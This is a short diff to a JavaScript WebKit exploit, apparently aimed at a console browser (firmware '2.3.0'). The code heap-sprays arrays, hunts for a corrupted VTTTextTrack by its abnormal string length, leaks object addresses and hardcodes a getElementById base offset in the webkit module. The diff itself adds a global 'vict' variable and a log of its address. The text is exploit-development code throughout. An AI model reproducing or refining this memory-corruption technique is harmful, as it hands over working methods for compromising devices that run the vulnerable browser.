@@ -44,6 +44,7 @@ function debug (msg) {
 var sprayCount = 0x30000;
 var ar = new Array(sprayCount);
 var vrs = new Array(1);
+var vict = null;
 function leakAddrs (obja, objb, objc, cb)
 {
     //---------------internal functions-------------------//
@@ -122,7 +123,7 @@ function leakAddrs (obja, objb, objc, cb)
         
         //search for corrupted VTTTextTrack
         for(var i=0; i<vrs.length; i++){
-            var vict = vrs[i].track.kind;
+            vict = vrs[i].track.kind;
             log("len: "+vict.length);
             if(vict.length > 2000000){
                 
@@ -397,6 +398,7 @@ getBase = function() {
     func = document.getElementById;
     func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
     funcaddr = null;
+    //2.3.0
     funcbase = 0x8365B8; // This is the base address for getElementById in the webkit module
   
   
@@ -495,6 +497,7 @@ function loadRun (obj)
     
     log("corruptedTrack: " + convert8(getAddr(vrs[0].track)));
     log("cleanTrack: " + convert8(getAddr(objM.track)));
+    log("vict: " + convert8(getAddr(vict)));
     
     
     while(true)
